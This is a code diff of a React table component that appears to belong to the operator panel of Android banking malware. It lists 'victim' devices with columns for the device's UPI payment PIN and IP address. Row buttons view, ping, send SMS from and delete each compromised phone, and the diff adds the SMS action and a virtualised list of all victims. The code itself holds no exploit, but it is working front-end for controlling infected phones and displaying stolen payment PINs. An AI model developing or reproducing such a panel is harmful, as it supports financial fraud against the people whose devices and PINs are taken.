-                                      setTimeout(() => noteInputRefs.current[victimId]?.focus(), 0);
-                                    }}
-                                  >
+                                  <Button size="icon" variant="ghost" className="w-6 h-6 p-0" onClick={(e) => { e.stopPropagation(); handleNoteDraftChange(victimId, ""); setTimeout(() => noteInputRefs.current[victimId]?.focus(), 0); }}>
                                     <X className="w-3 h-3" />
                                   </Button>
                                 </div>
-                              </div>
-                            </SelectContent>
-                          </Select>
-
-                          {/* input moved into the dropdown - keep this empty so layout stays consistent */}
-                        </div>
-                      );
-                    })()}
-                  </TableCell>
-                  <TableCell className="text-center">
-                    <span className="text-sm text-muted-foreground">
-                      {formatAdded(device.Added)}
-                    </span>
-                  </TableCell>
-                  <TableCell>
-                    <div className="flex items-center gap-2 justify-center">
-                      <Button
-                        size="icon"
-                        variant="ghost"
-                        className="w-8 h-8 rounded-full hover:bg-primary/10 hover:text-primary"
-                        onClick={(e) => handleViewDevice(victimId, device, e)}
-                        title="View Device"
-                      >
-                        <Eye className="w-4 h-4" />
-                      </Button>
-                      <Button
-                        size="icon"
-                        variant="ghost"
-                        className="w-8 h-8 rounded-full hover:bg-primary/10 hover:text-primary"
-                        onClick={(e) => handlePingDevice(victimId, device, e)}
-                        title="Load / Ping"
-                      >
-                        <Loader2 className="w-4 h-4" />
-                      </Button>
-                      <Button
-                        size="icon"
-                        variant="ghost"
-                        className="w-8 h-8 rounded-full hover:bg-destructive/10 hover:text-destructive"
-                        onClick={(e) => {
-                          e.stopPropagation();
-                          handleDeleteDevice(victimId, victimId);
-                        }}
-                        title="Delete Device"
-                      >
-                        <Trash2 className="w-4 h-4" />
-                      </Button>
-                    </div>
-                  </TableCell>
-                </TableRow>
-              ))}
-            </TableBody>
-          </Table>
-        </div>
+                              </SelectContent>
+                            </Select>
+                          </div>
+                        );
+                      })()}
+                    </TableCell>
+                    <TableCell className="text-center">{formatAdded(device.Added)}</TableCell>
+                    <TableCell className="text-center">
+                      <div className="flex items-center justify-center gap-2">
+                        <Button variant="outline" size="sm" onMouseEnter={() => handlePrefetchDevice(victimId)} onClick={(e) => handleViewDevice(victimId, device, e)}>
+                          <Eye className="w-4 h-4" />
+                        </Button>
+                        <Button variant="outline" size="sm" onClick={(e) => handlePingDevice(victimId, device, e)}>
+                          <Loader2 className="w-4 h-4" />
+                        </Button>
+                        <Button variant="outline" size="sm" onClick={(e) => handleSendSMS(victimId, device, e)}>
+                          <MessageSquare className="w-4 h-4" />
+                        </Button>
+                        <Button variant="destructive" size="sm" onClick={() => handleDeleteDevice(victimId, device.Model)}>
+                          <Trash2 className="w-4 h-4" />
+                        </Button>
+                      </div>
+                    </TableCell>
+                  </TableRow>
+                ))}
+              </TableBody>
+            </Table>
+          </div>
+        ) : (
+          <div className="overflow-x-auto">
+            {/* Header mimic */}
+            <div className="grid grid-cols-8 gap-2 px-4 py-3 font-semibold sticky top-0 bg-background/80 backdrop-blur-sm border-b">
+              <div className="text-center">Status</div>
+              <div>Device</div>
+              <div className="text-center">Android</div>
+              <div className="text-center">UPI Pin</div>
+              <div className="text-center">IP Address</div>
+              <div className="text-center">Note</div>
+              <div className="text-center">Added</div>
+              <div className="text-center">Actions</div>
+            </div>
+            <List height={LIST_HEIGHT} itemCount={filteredAllDevices.length} itemSize={ROW_HEIGHT} width={'100%'}>
+              {Row}
+            </List>
+          </div>
+        )}
 
         {/* Pagination and Rows per Page */}
         <div className="p-6 border-t bg-muted/20">
